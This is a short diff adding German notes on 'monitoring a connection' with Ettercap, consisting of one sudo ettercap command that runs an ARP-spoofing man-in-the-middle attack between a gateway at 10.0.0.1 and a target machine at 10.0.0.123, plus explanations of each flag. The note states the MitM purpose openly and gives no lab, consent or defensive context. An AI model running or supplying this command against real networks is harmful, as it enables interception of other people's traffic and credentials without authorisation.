@@ -1,0 +1,11 @@
+Mit Ettercap die Verbindung überwachen:
+
+sudo ettercap -T -S -M arp:remote /10.0.0.1// /10.0.0.123//
+
+Erklärung:
+
+-T = nur Textausgabe, ohne GUI
+-S = keine SSL-Certs anfertigen (Rohdaten)
+-M = MitM-Angriff
+/10.0.0.1// = Ziel-Router (Gateway)
+/10.0.0.123// = Ziel-Rechner
